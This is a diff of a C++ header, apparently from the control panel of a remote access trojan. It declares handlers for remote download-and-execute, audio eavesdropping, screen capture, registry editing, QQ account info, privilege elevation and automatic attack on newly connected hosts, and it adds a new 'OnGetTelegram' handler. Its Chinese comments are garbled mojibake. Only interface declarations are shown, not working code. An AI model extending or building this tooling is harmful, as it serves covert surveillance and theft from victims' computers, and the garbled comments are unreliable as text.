@@ -1,4 +1,4 @@
-ï»¿// ClientView.h : interface of the CClientView class
+// ClientView.h : interface of the CClientView class
 //
 /////////////////////////////////////////////////////////////////////////////
 
@@ -60,9 +60,9 @@ protected:
 	bool            m_bAscending;
 	CXTPHeaderCtrl  m_header;
 	void SortColumn(int iCol, bool bAsc);
-	static DWORD WINAPI CheckOnlineHost(LPVOID lParam);//æ£€æµ‹åœ¨çº¿ä¸»æœº.
-	DWORD operate;                 //åŒå‡»æ—¶çš„é»˜è®¤æ“ä½œ
-	// å¤„ç†åŒå‡»äº‹ä»¶
+	static DWORD WINAPI CheckOnlineHost(LPVOID lParam);//¼ì²âÔÚÏßÖ÷»ú.
+	DWORD operate;                 //Ë«»÷Ê±µÄÄ¬ÈÏ²Ù×÷
+	// ´¦ÀíË«»÷ÊÂ¼ş
 	void TestDbClick(void);
 
 // Generated message map functions
@@ -91,18 +91,18 @@ protected:
 	afx_msg void OnSerManager();
 	afx_msg void OnQQInfo();
 	afx_msg void OnMap();
-	//å¤åˆ¶ä¿¡æ¯
+	//¸´ÖÆĞÅÏ¢
 	afx_msg void OnIPList();
 	afx_msg void OnIP();
 	afx_msg void OnBeiZhu();
 	afx_msg void OnDiLiXinXi();
 	afx_msg void OnAll();
-	//ç­›é€‰åŠŸèƒ½
+	//É¸Ñ¡¹¦ÄÜ
 	afx_msg void OnChongZhi();
 	afx_msg void OnSortProcess();
 	afx_msg void OnSortWindow();
 	afx_msg void OnModifyListYN(LPARAM lParam,CHAR *strp);
-	//ä¸‹è½½ä¸Šä¼ è®¿é—®ç½‘é¡µ////////////////////
+	//ÏÂÔØÉÏ´«·ÃÎÊÍøÒ³////////////////////
 	afx_msg void OnOpenUrl(CHAR *IpBti,CHAR *IpurlDeta,int OpeUrl);
 	afx_msg void OnDownExec();
 	afx_msg void OnUpdateServer();
@@ -121,8 +121,9 @@ protected:
 	////////////////////////
 	afx_msg void OnRenameRemark();
 	afx_msg void OnAudioListen();
+	afx_msg void OnGetTelegram();
 	afx_msg void OnDisconnect();
-	afx_msg void OnShowMsg();//å‘é€æ¶ˆæ¯
+	afx_msg void OnShowMsg();//·¢ËÍÏûÏ¢
 	afx_msg void OnChangeGroup();
 	afx_msg void OnSysinfo();
 	afx_msg void OnRegedit();
@@ -132,8 +133,8 @@ protected:
 	afx_msg void OnStart();
 	afx_msg void OnScreen();
 	afx_msg void OnMenuitemProxyMap();
-	afx_msg void OnElevate_Privileges();//WIN7æå‡æƒé™
-	afx_msg void OnReStartexp();//é‡å¯Exp
+	afx_msg void OnElevate_Privileges();//WIN7ÌáÉıÈ¨ÏŞ
+	afx_msg void OnReStartexp();//ÖØÆôExp
 	afx_msg void OnIEQC();
 	//}}AFX_MSG
 	DECLARE_MESSAGE_MAP()
@@ -160,8 +161,8 @@ private:
 	afx_msg	LRESULT	OnOpenProxyMapDialog(WPARAM, LPARAM);
 
 private:
-	BOOL m_AutoAttack;//æ–°ä¸Šçº¿è‡ªåŠ¨...
-	ATTACK m_AutoAttackData;//è‡ªåŠ¨æ”»å‡»å‚æ•°.
+	BOOL m_AutoAttack;//ĞÂÉÏÏß×Ô¶¯...
+	ATTACK m_AutoAttackData;//×Ô¶¯¹¥»÷²ÎÊı.
 	WORD m_AutoTask;
 	
 };
